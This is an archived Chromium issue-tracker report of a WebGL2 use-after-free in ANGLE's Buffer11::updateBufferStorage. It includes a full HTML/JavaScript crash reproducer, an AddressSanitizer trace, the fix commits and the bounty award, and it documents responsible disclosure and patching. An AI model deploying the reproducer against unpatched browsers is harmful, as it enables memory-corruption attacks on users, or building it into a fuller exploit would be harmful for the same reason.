# Security: WebGL - Use After Free in Buffer11::updateBufferStorage()

| Field | Value |
|-------|-------|
| **Issue ID** | [40086542](https://issues.chromium.org/issues/40086542) |
| **Status** | Accepted |
| **Severity** | S3-Low |
| **Priority** | P4 |
| **Component** | Blink>WebGL, Internals>GPU>ANGLE |
| **Platforms** | Windows |
| **Reporter** | lo...@gmail.com |
| **Assignee** | jm...@chromium.org |
| **Created** | 2017-01-17 |
| **Bounty** | $5,000.00 |

## Description

**VULNERABILITY DETAILS**  

Steps to reproduce:

```
1. Open UAF_updateBufferStorage_Repro.html in  Chrome browser.  
2. Chrome crashes  in rx::Buffer11::updateBufferStorage caused by a Use After Free.  

	==23588==ERROR: AddressSanitizer: heap-use-after-free on address 0x22c337f0 at pc 0x08ce5ee4 bp 0x0053c4bc sp 0x0053c4b0  
	READ of size 4 at 0x22c337f0 thread T0  

		#0 0x8ce5ee3 in rx::Buffer11::updateBufferStorage C:\b\c\b\win_asan_release\src\third_party\angle\src\libANGLE\renderer\d3d\d3d11\Buffer11.cpp:807  

```

**VERSION**

```
Chromium	57.0.2985.0 (Developer Build) (32-bit)  

( https://www.googleapis.com/download/storage/v1/b/chromium-browser-asan/o/win32-release%2Fasan-win32-release-444071.zip?generation=1484683044955953&alt=media )  

Operating System: Windows 10   

```

**REPRODUCTION CASE** (UAF\_updateBufferStorage\_Repro.html )

```
<html><body ><canvas id="test"></canvas></body><script>  
var canvas0=document.getElementById("test");  
var gl = canvas0.getContext("webgl2");  
var buffer0= gl.createBuffer();  
gl.bindBuffer(gl.UNIFORM_BUFFER, buffer0);   
gl.bindBuffer(gl.ARRAY_BUFFER, buffer0);   
var myImage = new Image();myImage.src = "non.jpg";myImage.onerror = function(){ canvas0.width = "418";}   
var observer0 =new MutationObserver(function listener1(event) {  
if( typeof listener1.counter == "undefined"){listener1.counter = 0;}  
if(listener1.counter > 3) return;  
listener1.counter++;  
var vertices  = [ 1.0,  1.0,  0.0,  -1.0, 1.0,  0.0,  1.0,  -1.0, 0.0, -1.0, -1.0, 0.0];   
gl.bufferData(gl.ARRAY_BUFFER, new Float32Array(vertices), gl.STATIC_DRAW);;   
canvas0.width = "418";  
gl.bufferData(gl.UNIFORM_BUFFER, 2626,gl.STATIC_COPY);   
}); observer0.observe(canvas0, {attributes: true});  
var timeout0 = setTimeout(function(){  gl.bufferData(gl.ARRAY_BUFFER, 2167,gl.STREAM_DRAW); }, 74);  
</script></html>  

```

**FOR CRASHES, PLEASE INCLUDE THE FOLLOWING ADDITIONAL INFORMATION**

Type of crash: tab  

Crash State:

```
=================================================================  
==23588==ERROR: AddressSanitizer: heap-use-after-free on address 0x22c337f0 at pc 0x08ce5ee4 bp 0x0053c4bc sp 0x0053c4b0  
READ of size 4 at 0x22c337f0 thread T0  

	#0 0x8ce5ee3 in rx::Buffer11::updateBufferStorage C:\b\c\b\win_asan_release\src\third_party\angle\src\libANGLE\renderer\d3d\d3d11\Buffer11.cpp:807  
	#1 0x8cd96b0 in rx::Buffer11::getBufferStorage C:\b\c\b\win_asan_release\src\third_party\angle\src\libANGLE\renderer\d3d\d3d11\Buffer11.cpp:695  
	#2 0x8cd9054 in rx::Buffer11::getSystemMemoryStorage C:\b\c\b\win_asan_release\src\third_party\angle\src\libANGLE\renderer\d3d\d3d11\Buffer11.cpp:323  
	#3 0x8cda0f4 in rx::Buffer11::setSubData C:\b\c\b\win_asan_release\src\third_party\angle\src\libANGLE\renderer\d3d\d3d11\Buffer11.cpp:360  
	#4 0x8cd8a56 in rx::Buffer11::setData C:\b\c\b\win_asan_release\src\third_party\angle\src\libANGLE\renderer\d3d\d3d11\Buffer11.cpp:305  
	#5 0x8ad20a2 in gl::Buffer::bufferData C:\b\c\b\win_asan_release\src\third_party\angle\src\libANGLE\Buffer.cpp:57  
	#6 0x898eff4 in gl::Context::bufferData C:\b\c\b\win_asan_release\src\third_party\angle\src\libANGLE\Context.cpp:3572  
	#7 0x1a881e73 in gpu::gles2::BufferManager::DoBufferData C:\b\c\b\win_asan_release\src\gpu\command_buffer\service\buffer_manager.cc:463  
	#8 0x1a8818e7 in gpu::gles2::BufferManager::ValidateAndDoBufferData C:\b\c\b\win_asan_release\src\gpu\command_buffer\service\buffer_manager.cc:431  
	#9 0x1c3f5a0d in gpu::gles2::GLES2DecoderImpl::HandleBufferData C:\b\c\b\win_asan_release\src\gpu\command_buffer\service\gles2_cmd_decoder.cc:12336  
	#10 0x1c4684f9 in gpu::gles2::GLES2DecoderImpl::DoCommandsImpl<0> C:\b\c\b\win_asan_release\src\gpu\command_buffer\service\gles2_cmd_decoder.cc:5210  
	#11 0x1a8a0cb3 in gpu::CommandParser::ProcessCommands C:\b\c\b\win_asan_release\src\gpu\command_buffer\service\cmd_parser.cc:53  
	#12 0x1c4cbfa1 in gpu::CommandExecutor::PutChanged C:\b\c\b\win_asan_release\src\gpu\command_buffer\service\command_executor.cc:61  
	#13 0x1c3f18c6 in gpu::CommandBufferService::Flush C:\b\c\b\win_asan_release\src\gpu\command_buffer\service\command_buffer_service.cc:98  
	#14 0x1ac3ed79 in gpu::GpuCommandBufferStub::OnAsyncFlush C:\b\c\b\win_asan_release\src\gpu\ipc\service\gpu_command_buffer_stub.cc:886  
	#15 0x1ac3e7b4 in IPC::MessageT<GpuCommandBufferMsg_AsyncFlush_Meta,std::tuple<int,unsigned int,std::vector<ui::LatencyInfo,std::allocator<ui::LatencyInfo> > >,void>::Dispatch<gpu::GpuCommandBufferStub,gpu::GpuCommandBufferStub,void,void (gpu::GpuCommandBufferStub::\*)(int, unsigned int, const std::vector<ui::LatencyInfo,std::allocator<ui::LatencyInfo> > &) __attribute__((thiscall))> C:\b\c\b\win_asan_release\src\ipc\ipc_message_templates.h:120  
	#16 0x1ac39fc3 in gpu::GpuCommandBufferStub::OnMessageReceived C:\b\c\b\win_asan_release\src\gpu\ipc\service\gpu_command_buffer_stub.cc:298  
	#17 0x1ac29518 in gpu::GpuChannel::HandleMessageHelper C:\b\c\b\win_asan_release\src\gpu\ipc\service\gpu_channel.cc:806  
	#18 0x1ac2937f in gpu::GpuChannel::HandleMessage C:\b\c\b\win_asan_release\src\gpu\ipc\service\gpu_channel.cc:786  
	#19 0x14bb4fb4 in base::internal::Invoker<base::internal::BindState<void (media::GpuVideoDecoder::\*)(const base::Callback<void (),base::internal::CopyMode::Copyable,base::internal::RepeatMode::Repeating> &) __attribute__((thiscall)),base::WeakPtr<media::GpuVideoDecoder>,base::Callback<void (),base::internal::CopyMode::Copyable,base::internal::RepeatMode::Repeating> >,void ()>::Run C:\b\c\b\win_asan_release\src\base\bind_internal.h:340  
	#20 0x1335be25 in base::debug::TaskAnnotator::RunTask C:\b\c\b\win_asan_release\src\base\debug\task_annotator.cc:50  
	#21 0x13209a0f in base::MessageLoop::RunTask C:\b\c\b\win_asan_release\src\base\message_loop\message_loop.cc:421  
	#22 0x1320a856 in base::MessageLoop::DeferOrRunPendingTask C:\b\c\b\win_asan_release\src\base\message_loop\message_loop.cc:430  
	#23 0x1320bb66 in base::MessageLoop::DoWork C:\b\c\b\win_asan_release\src\base\message_loop\message_loop.cc:523  
	#24 0x1336240a in base::MessagePumpDefault::Run C:\b\c\b\win_asan_release\src\base\message_loop\message_pump_default.cc:33  
	#25 0x13208a79 in base::MessageLoop::RunHandler C:\b\c\b\win_asan_release\src\base\message_loop\message_loop.cc:386  
	#26 0x1328832d in base::RunLoop::Run C:\b\c\b\win_asan_release\src\base\run_loop.cc:37  
	#27 0x159373b3 in content::GpuMain C:\b\c\b\win_asan_release\src\content\gpu\gpu_main.cc:304  
	#28 0x13093723 in content::RunNamedProcessTypeMain C:\b\c\b\win_asan_release\src\content\app\content_main_runner.cc:416  
	#29 0x13094dc0 in content::ContentMainRunnerImpl::Run C:\b\c\b\win_asan_release\src\content\app\content_main_runner.cc:793  
	#30 0x130932fc in content::ContentMain C:\b\c\b\win_asan_release\src\content\app\content_main.cc:20  
	#31 0xfc211fe in ChromeMain C:\b\c\b\win_asan_release\src\chrome\app\chrome_main.cc:112  
	#32 0xce93c3 in MainDllLoader::Launch C:\b\c\b\win_asan_release\src\chrome\app\main_dll_loader_win.cc:171  
	#33 0xce1964 in main C:\b\c\b\win_asan_release\src\chrome\app\chrome_exe_main_win.cc:285  
	#34 0xef35ad in __scrt_common_main_seh f:\dd\vctools\crt\vcstartup\src\startup\exe_common.inl:253  
	#35 0x76d638f3 in BaseThreadInitThunk+0x23 (C:\WINDOWS\SYSTEM32\KERNEL32.DLL+0x6b8138f3)  
	#36 0x77cc5de2 in RtlUnicodeStringToInteger+0x252 (C:\WINDOWS\SYSTEM32\ntdll.dll+0x4b2e5de2)  
	#37 0x77cc5dad in RtlUnicodeStringToInteger+0x21d (C:\WINDOWS\SYSTEM32\ntdll.dll+0x4b2e5dad)  

0x22c337f0 is located 0 bytes inside of 28-byte region [0x22c337f0,0x22c3380c)  
freed by thread T0 here:  
	#0 0xeda1a8 in free e:\b\build\slave\win_upload_clang\build\src\third_party\llvm\projects\compiler-rt\lib\asan\asan_malloc_win.cc:44  
	#1 0x8ce9aa8 in rx::Buffer11::SystemMemoryStorage::~SystemMemoryStorage C:\b\c\b\win_asan_release\src\third_party\angle\src\libANGLE\renderer\d3d\d3d11\Buffer11.cpp:253  
	#2 0x8cde6bd in rx::Buffer11::checkForDeallocation C:\b\c\b\win_asan_release\src\third_party\angle\src\libANGLE\renderer\d3d\d3d11\Buffer11.cpp:552  
	#3 0x8cdeb2a in rx::Buffer11::markBufferUsage C:\b\c\b\win_asan_release\src\third_party\angle\src\libANGLE\renderer\d3d\d3d11\Buffer11.cpp:580  
	#4 0x8cd97f8 in rx::Buffer11::getBufferStorage C:\b\c\b\win_asan_release\src\third_party\angle\src\libANGLE\renderer\d3d\d3d11\Buffer11.cpp:696  
	#5 0x8cdadfa in rx::Buffer11::getStagingStorage C:\b\c\b\win_asan_release\src\third_party\angle\src\libANGLE\renderer\d3d\d3d11\Buffer11.cpp:847  
	#6 0x8ce5857 in rx::Buffer11::updateBufferStorage C:\b\c\b\win_asan_release\src\third_party\angle\src\libANGLE\renderer\d3d\d3d11\Buffer11.cpp:795  
	#7 0x8cd96b0 in rx::Buffer11::getBufferStorage C:\b\c\b\win_asan_release\src\third_party\angle\src\libANGLE\renderer\d3d\d3d11\Buffer11.cpp:695  
	#8 0x8cd9054 in rx::Buffer11::getSystemMemoryStorage C:\b\c\b\win_asan_release\src\third_party\angle\src\libANGLE\renderer\d3d\d3d11\Buffer11.cpp:323  
	#9 0x8cda0f4 in rx::Buffer11::setSubData C:\b\c\b\win_asan_release\src\third_party\angle\src\libANGLE\renderer\d3d\d3d11\Buffer11.cpp:360  
	#10 0x8cd8a56 in rx::Buffer11::setData C:\b\c\b\win_asan_release\src\third_party\angle\src\libANGLE\renderer\d3d\d3d11\Buffer11.cpp:305  
	#11 0x8ad20a2 in gl::Buffer::bufferData C:\b\c\b\win_asan_release\src\third_party\angle\src\libANGLE\Buffer.cpp:57  
	#12 0x898eff4 in gl::Context::bufferData C:\b\c\b\win_asan_release\src\third_party\angle\src\libANGLE\Context.cpp:3572  
	#13 0x1a881e73 in gpu::gles2::BufferManager::DoBufferData C:\b\c\b\win_asan_release\src\gpu\command_buffer\service\buffer_manager.cc:463  
	#14 0x1a8818e7 in gpu::gles2::BufferManager::ValidateAndDoBufferData C:\b\c\b\win_asan_release\src\gpu\command_buffer\service\buffer_manager.cc:431  
	#15 0x1c3f5a0d in gpu::gles2::GLES2DecoderImpl::HandleBufferData C:\b\c\b\win_asan_release\src\gpu\command_buffer\service\gles2_cmd_decoder.cc:12336  
	#16 0x1c4684f9 in gpu::gles2::GLES2DecoderImpl::DoCommandsImpl<0> C:\b\c\b\win_asan_release\src\gpu\command_buffer\service\gles2_cmd_decoder.cc:5210  
	#17 0x1a8a0cb3 in gpu::CommandParser::ProcessCommands C:\b\c\b\win_asan_release\src\gpu\command_buffer\service\cmd_parser.cc:53  
	#18 0x1c4cbfa1 in gpu::CommandExecutor::PutChanged C:\b\c\b\win_asan_release\src\gpu\command_buffer\service\command_executor.cc:61  
	#19 0x1c3f18c6 in gpu::CommandBufferService::Flush C:\b\c\b\win_asan_release\src\gpu\command_buffer\service\command_buffer_service.cc:98  
	#20 0x1ac3ed79 in gpu::GpuCommandBufferStub::OnAsyncFlush C:\b\c\b\win_asan_release\src\gpu\ipc\service\gpu_command_buffer_stub.cc:886  
	#21 0x1ac3e7b4 in IPC::MessageT<GpuCommandBufferMsg_AsyncFlush_Meta,std::tuple<int,unsigned int,std::vector<ui::LatencyInfo,std::allocator<ui::LatencyInfo> > >,void>::Dispatch<gpu::GpuCommandBufferStub,gpu::GpuCommandBufferStub,void,void (gpu::GpuCommandBufferStub::\*)(int, unsigned int, const std::vector<ui::LatencyInfo,std::allocator<ui::LatencyInfo> > &) __attribute__((thiscall))> C:\b\c\b\win_asan_release\src\ipc\ipc_message_templates.h:120  
	#22 0x1ac39fc3 in gpu::GpuCommandBufferStub::OnMessageReceived C:\b\c\b\win_asan_release\src\gpu\ipc\service\gpu_command_buffer_stub.cc:298  
	#23 0x1ac29518 in gpu::GpuChannel::HandleMessageHelper C:\b\c\b\win_asan_release\src\gpu\ipc\service\gpu_channel.cc:806  
	#24 0x1ac2937f in gpu::GpuChannel::HandleMessage C:\b\c\b\win_asan_release\src\gpu\ipc\service\gpu_channel.cc:786  
	#25 0x14bb4fb4 in base::internal::Invoker<base::internal::BindState<void (media::GpuVideoDecoder::\*)(const base::Callback<void (),base::internal::CopyMode::Copyable,base::internal::RepeatMode::Repeating> &) __attribute__((thiscall)),base::WeakPtr<media::GpuVideoDecoder>,base::Callback<void (),base::internal::CopyMode::Copyable,base::internal::RepeatMode::Repeating> >,void ()>::Run C:\b\c\b\win_asan_release\src\base\bind_internal.h:340  
	#26 0x1335be25 in base::debug::TaskAnnotator::RunTask C:\b\c\b\win_asan_release\src\base\debug\task_annotator.cc:50  
	#27 0x13209a0f in base::MessageLoop::RunTask C:\b\c\b\win_asan_release\src\base\message_loop\message_loop.cc:421  
	#28 0x1320a856 in base::MessageLoop::DeferOrRunPendingTask C:\b\c\b\win_asan_release\src\base\message_loop\message_loop.cc:430  

previously allocated by thread T0 here:  
	#0 0xeda28c in malloc e:\b\build\slave\win_upload_clang\build\src\third_party\llvm\projects\compiler-rt\lib\asan\asan_malloc_win.cc:65  
	#1 0x903d3d8 in operator new f:\dd\vctools\crt\vcstartup\src\heap\new_scalar.cpp:19  
	#2 0x8ce4af8 in rx::Buffer11::allocateStorage C:\b\c\b\win_asan_release\src\third_party\angle\src\libANGLE\renderer\d3d\d3d11\Buffer11.cpp:709  
	#3 0x8cd94be in rx::Buffer11::getBufferStorage C:\b\c\b\win_asan_release\src\third_party\angle\src\libANGLE\renderer\d3d\d3d11\Buffer11.cpp:686  
	#4 0x8cd9054 in rx::Buffer11::getSystemMemoryStorage C:\b\c\b\win_asan_release\src\third_party\angle\src\libANGLE\renderer\d3d\d3d11\Buffer11.cpp:323  
	#5 0x8cda0f4 in rx::Buffer11::setSubData C:\b\c\b\win_asan_release\src\third_party\angle\src\libANGLE\renderer\d3d\d3d11\Buffer11.cpp:360  
	#6 0x8cd8a56 in rx::Buffer11::setData C:\b\c\b\win_asan_release\src\third_party\angle\src\libANGLE\renderer\d3d\d3d11\Buffer11.cpp:305  
	#7 0x8ad20a2 in gl::Buffer::bufferData C:\b\c\b\win_asan_release\src\third_party\angle\src\libANGLE\Buffer.cpp:57  
	#8 0x898eff4 in gl::Context::bufferData C:\b\c\b\win_asan_release\src\third_party\angle\src\libANGLE\Context.cpp:3572  
	#9 0x1a881e73 in gpu::gles2::BufferManager::DoBufferData C:\b\c\b\win_asan_release\src\gpu\command_buffer\service\buffer_manager.cc:463  
	#10 0x1a8818e7 in gpu::gles2::BufferManager::ValidateAndDoBufferData C:\b\c\b\win_asan_release\src\gpu\command_buffer\service\buffer_manager.cc:431  
	#11 0x1c3f5a0d in gpu::gles2::GLES2DecoderImpl::HandleBufferData C:\b\c\b\win_asan_release\src\gpu\command_buffer\service\gles2_cmd_decoder.cc:12336  
	#12 0x1c4684f9 in gpu::gles2::GLES2DecoderImpl::DoCommandsImpl<0> C:\b\c\b\win_asan_release\src\gpu\command_buffer\service\gles2_cmd_decoder.cc:5210  
	#13 0x1a8a0cb3 in gpu::CommandParser::ProcessCommands C:\b\c\b\win_asan_release\src\gpu\command_buffer\service\cmd_parser.cc:53  
	#14 0x1c4cbfa1 in gpu::CommandExecutor::PutChanged C:\b\c\b\win_asan_release\src\gpu\command_buffer\service\command_executor.cc:61  
	#15 0x1c3f18c6 in gpu::CommandBufferService::Flush C:\b\c\b\win_asan_release\src\gpu\command_buffer\service\command_buffer_service.cc:98  
	#16 0x1ac3ed79 in gpu::GpuCommandBufferStub::OnAsyncFlush C:\b\c\b\win_asan_release\src\gpu\ipc\service\gpu_command_buffer_stub.cc:886  
	#17 0x1ac3e7b4 in IPC::MessageT<GpuCommandBufferMsg_AsyncFlush_Meta,std::tuple<int,unsigned int,std::vector<ui::LatencyInfo,std::allocator<ui::LatencyInfo> > >,void>::Dispatch<gpu::GpuCommandBufferStub,gpu::GpuCommandBufferStub,void,void (gpu::GpuCommandBufferStub::\*)(int, unsigned int, const std::vector<ui::LatencyInfo,std::allocator<ui::LatencyInfo> > &) __attribute__((thiscall))> C:\b\c\b\win_asan_release\src\ipc\ipc_message_templates.h:120  
	#18 0x1ac39fc3 in gpu::GpuCommandBufferStub::OnMessageReceived C:\b\c\b\win_asan_release\src\gpu\ipc\service\gpu_command_buffer_stub.cc:298  
	#19 0x1ac29518 in gpu::GpuChannel::HandleMessageHelper C:\b\c\b\win_asan_release\src\gpu\ipc\service\gpu_channel.cc:806  
	#20 0x1ac2937f in gpu::GpuChannel::HandleMessage C:\b\c\b\win_asan_release\src\gpu\ipc\service\gpu_channel.cc:786  
	#21 0x14bb4fb4 in base::internal::Invoker<base::internal::BindState<void (media::GpuVideoDecoder::\*)(const base::Callback<void (),base::internal::CopyMode::Copyable,base::internal::RepeatMode::Repeating> &) __attribute__((thiscall)),base::WeakPtr<media::GpuVideoDecoder>,base::Callback<void (),base::internal::CopyMode::Copyable,base::internal::RepeatMode::Repeating> >,void ()>::Run C:\b\c\b\win_asan_release\src\base\bind_internal.h:340  
	#22 0x1335be25 in base::debug::TaskAnnotator::RunTask C:\b\c\b\win_asan_release\src\base\debug\task_annotator.cc:50  
	#23 0x13209a0f in base::MessageLoop::RunTask C:\b\c\b\win_asan_release\src\base\message_loop\message_loop.cc:421  
	#24 0x1320a856 in base::MessageLoop::DeferOrRunPendingTask C:\b\c\b\win_asan_release\src\base\message_loop\message_loop.cc:430  
	#25 0x1320bb66 in base::MessageLoop::DoWork C:\b\c\b\win_asan_release\src\base\message_loop\message_loop.cc:523  
	#26 0x1336240a in base::MessagePumpDefault::Run C:\b\c\b\win_asan_release\src\base\message_loop\message_pump_default.cc:33  
	#27 0x13208a79 in base::MessageLoop::RunHandler C:\b\c\b\win_asan_release\src\base\message_loop\message_loop.cc:386  
	#28 0x1328832d in base::RunLoop::Run C:\b\c\b\win_asan_release\src\base\run_loop.cc:37  

SUMMARY: AddressSanitizer: heap-use-after-free C:\b\c\b\win_asan_release\src\third_party\angle\src\libANGLE\renderer\d3d\d3d11\Buffer11.cpp:807 in rx::Buffer11::updateBufferStorage  
Shadow bytes around the buggy address:  
  0x345866a0: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa  
  0x345866b0: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa  
  0x345866c0: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa  
  0x345866d0: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa  
  0x345866e0: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa  
=>0x345866f0: fa fa fa fa fa fa fa fa fa fa fa fa fa fa[fd]fd  
  0x34586700: fd fd fa fa fd fd fd fd fa fa fd fd fd fd fa fa  
  0x34586710: fd fd fd fd fa fa fd fd fd fd fa fa fd fd fd fd  
  0x34586720: fa fa fd fd fd fd fa fa fd fd fd fd fa fa fd fd  
  0x34586730: fd fa fa fa fd fd fd fa fa fa fd fd fd fa fa fa  
  0x34586740: fd fd fd fa fa fa fd fd fd fd fa fa fd fd fd fa  
Shadow byte legend (one shadow byte represents 8 application bytes):  
  Addressable:           00  
  Partially addressable: 01 02 03 04 05 06 07   
  Heap left redzone:       fa  
  Freed heap region:       fd  
  Stack left redzone:      f1  
  Stack mid redzone:       f2  
  Stack right redzone:     f3  
  Stack after return:      f5  
  Stack use after scope:   f8  
  Global redzone:          f9  
  Global init order:       f6  
  Poisoned by user:        f7  
  Container overflow:      fc  
  Array cookie:            ac  
  Intra object redzone:    bb  
  ASan internal:           fe  
  Left alloca redzone:     ca  
  Right alloca redzone:    cb  
==23588==ABORTING  

```

## Attachments

- [UAF_updateBufferStorage_Repro.html](attachments/UAF_updateBufferStorage_Repro.html) (text/plain, 966 B)

## Timeline

### cl...@chromium.org (2017-01-18)

ClusterFuzz is analyzing your testcase. Developers can follow the progress at https://cluster-fuzz.appspot.com/testcase?key=6439452726788096

### pa...@chromium.org (2017-01-18)

Assigning to kbr for further triage.

[Monorail components: Blink>WebGL]

### kb...@chromium.org (2017-01-18)

Jamie or Geoff, could you please investigate this? Thanks.


[Monorail components: Internals>GPU>ANGLE]

### jm...@chromium.org (2017-01-19)

Will look.

### jm...@chromium.org (2017-01-19)

Fix up at https://chromium-review.googlesource.com/430304 . 

### lo...@gmail.com (2017-01-19)

I reported the same issue to Mozilla:https://bugzilla.mozilla.org/show_bug.cgi?id=1325511 .
The exact same test case also triggers a Use After Free in Firefox. 
They have figured out a fix. If you want to know the detail of their investigation and fix, you can cc or contact the Mozilla engineer milan@mozilla.com.

### bu...@chromium.org (2017-01-19)

The following revision refers to this bug:
  https://chromium.googlesource.com/angle/angle/+/c1a5d16e964ad524487eac9d2e4b5a65d837ff27

commit c1a5d16e964ad524487eac9d2e4b5a65d837ff27
Author: Jamie Madill <jmadill@chromium.org>
Date: Thu Jan 19 04:01:35 2017

Buffer11: Fix use-after-free with system memory storage.

Certain use patterns could trigger a deallocation of the system memory
storage as it was being initialized. Fix this by resetting the idle
counter before we enter into the internal update which would trigger
the deallocation check.

BUG=chromium:682020

Change-Id: Ic3dac78ffa778cbaf103820a23eea009ce439d5c
Reviewed-on: https://chromium-review.googlesource.com/430304
Reviewed-by: Geoff Lang <geofflang@chromium.org>
Reviewed-by: Corentin Wallez <cwallez@chromium.org>
Commit-Queue: Jamie Madill <jmadill@chromium.org>

[modify] https://crrev.com/c1a5d16e964ad524487eac9d2e4b5a65d837ff27/src/libANGLE/renderer/d3d/d3d11/Buffer11.cpp
[modify] https://crrev.com/c1a5d16e964ad524487eac9d2e4b5a65d837ff27/src/libANGLE/renderer/d3d/d3d11/Buffer11.h


### bu...@chromium.org (2017-01-19)

The following revision refers to this bug:
  https://chromium.googlesource.com/chromium/src.git/+/fac0dd9a0f5c5a585aeaf4f0b45080b89328a50f

commit fac0dd9a0f5c5a585aeaf4f0b45080b89328a50f
Author: geofflang <geofflang@chromium.org>
Date: Thu Jan 19 21:06:40 2017

Roll ANGLE fd8b469..c1a5d16

https://chromium.googlesource.com/angle/angle.git/+log/fd8b469..c1a5d16

BUG=chromium:682020

TBR=cwallez@chromium.org

TEST=bots

CQ_INCLUDE_TRYBOTS=master.tryserver.chromium.win:win_optional_gpu_tests_rel;master.tryserver.chromium.mac:mac_optional_gpu_tests_rel;master.tryserver.chromium.linux:linux_optional_gpu_tests_rel;master.tryserver.chromium.android:android_optional_gpu_tests_rel

Review-Url: https://codereview.chromium.org/2640983004
Cr-Commit-Position: refs/heads/master@{#444844}

[modify] https://crrev.com/fac0dd9a0f5c5a585aeaf4f0b45080b89328a50f/DEPS


### jm...@chromium.org (2017-01-20)

Should be fixed in next Canary. Will monitor and merge request once verified.

### sh...@chromium.org (2017-01-20)

[Empty comment from Monorail migration]

### jm...@chromium.org (2017-01-24)

I believe this made it into M57. (444844 in #8, Omaha proxy lists 444943). I downloaded 432437 from the common data storage site and it seemed to repro in that version of M56. Marking merge request for M56, this is a potentially dangerous security issue that has circulated in Canary for several days, and is a small targeted fix:

https://chromium-review.googlesource.com/430304

### sh...@chromium.org (2017-01-24)

This bug requires manual review: We are only 6 days from stable.
Please contact the milestone owner if you have questions.
Owners: amineer@(clank), cmasso@(bling), gkihumba@(cros), bustamante@(desktop)

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### bu...@google.com (2017-01-27)

LGTM, approved for merge into M56

### bu...@chromium.org (2017-01-27)

The following revision refers to this bug:
  https://chromium.googlesource.com/angle/angle/+/a4aaa2de57dc51243da35ea147d289a21a9f0c49

commit a4aaa2de57dc51243da35ea147d289a21a9f0c49
Author: Jamie Madill <jmadill@chromium.org>
Date: Thu Jan 19 04:01:35 2017

Buffer11: Fix use-after-free with system memory storage.

Certain use patterns could trigger a deallocation of the system memory
storage as it was being initialized. Fix this by resetting the idle
counter before we enter into the internal update which would trigger
the deallocation check.

BUG=chromium:682020

Change-Id: Ic3dac78ffa778cbaf103820a23eea009ce439d5c
Reviewed-on: https://chromium-review.googlesource.com/430304
Reviewed-by: Geoff Lang <geofflang@chromium.org>
Reviewed-by: Corentin Wallez <cwallez@chromium.org>
Commit-Queue: Jamie Madill <jmadill@chromium.org>
(cherry picked from commit c1a5d16e964ad524487eac9d2e4b5a65d837ff27)
Reviewed-on: https://chromium-review.googlesource.com/434066
Reviewed-by: Jamie Madill <jmadill@chromium.org>

[modify] https://crrev.com/a4aaa2de57dc51243da35ea147d289a21a9f0c49/src/libANGLE/renderer/d3d/d3d11/Buffer11.cpp
[modify] https://crrev.com/a4aaa2de57dc51243da35ea147d289a21a9f0c49/src/libANGLE/renderer/d3d/d3d11/Buffer11.h


### bu...@chromium.org (2017-01-27)

The following revision refers to this bug:
  https://chromium.googlesource.com/angle/angle/+/a4aaa2de57dc51243da35ea147d289a21a9f0c49

commit a4aaa2de57dc51243da35ea147d289a21a9f0c49
Author: Jamie Madill <jmadill@chromium.org>
Date: Thu Jan 19 04:01:35 2017

Buffer11: Fix use-after-free with system memory storage.

Certain use patterns could trigger a deallocation of the system memory
storage as it was being initialized. Fix this by resetting the idle
counter before we enter into the internal update which would trigger
the deallocation check.

BUG=chromium:682020

Change-Id: Ic3dac78ffa778cbaf103820a23eea009ce439d5c
Reviewed-on: https://chromium-review.googlesource.com/430304
Reviewed-by: Geoff Lang <geofflang@chromium.org>
Reviewed-by: Corentin Wallez <cwallez@chromium.org>
Commit-Queue: Jamie Madill <jmadill@chromium.org>
(cherry picked from commit c1a5d16e964ad524487eac9d2e4b5a65d837ff27)
Reviewed-on: https://chromium-review.googlesource.com/434066
Reviewed-by: Jamie Madill <jmadill@chromium.org>

[modify] https://crrev.com/a4aaa2de57dc51243da35ea147d289a21a9f0c49/src/libANGLE/renderer/d3d/d3d11/Buffer11.cpp
[modify] https://crrev.com/a4aaa2de57dc51243da35ea147d289a21a9f0c49/src/libANGLE/renderer/d3d/d3d11/Buffer11.h


### oc...@chromium.org (2017-02-14)

[Empty comment from Monorail migration]

### lo...@gmail.com (2017-02-21)

Can someone add a reward-topanel label to this report so it can be seen by security team? Thanks.

### jm...@chromium.org (2017-02-22)

Added label. This was a serious security regression and should be commended.

### aw...@chromium.org (2017-03-05)

[Empty comment from Monorail migration]

### aw...@chromium.org (2017-03-05)

Congratulations! The panel decided to award $5,000 for this bug! The panel noted that while it's not a full sandbox escape, it is more powerful than a simple renderer execution, and the Chrome command buffer mitigations would likely not catch this.  Very nice!

### aw...@chromium.org (2017-03-06)

[Empty comment from Monorail migration]

### aw...@chromium.org (2017-03-07)

[Empty comment from Monorail migration]

### aw...@chromium.org (2017-03-08)

[Empty comment from Monorail migration]

### sh...@chromium.org (2017-04-28)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### aw...@chromium.org (2018-04-25)

[Empty comment from Monorail migration]

### is...@google.com (2018-04-25)

This issue was migrated from crbug.com/chromium/682020?no_tracker_redirect=1

[Multiple monorail components: Blink>WebGL, Internals>GPU>ANGLE]
[Monorail components added to Component Tags custom field.]

### pe...@google.com (2024-03-12)

You have been auto-cc'ed due to this issue's component.
To update this component's auto-cc rules, visit
go/peepsi-blintz-auto-cc-rules

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/40086542)*
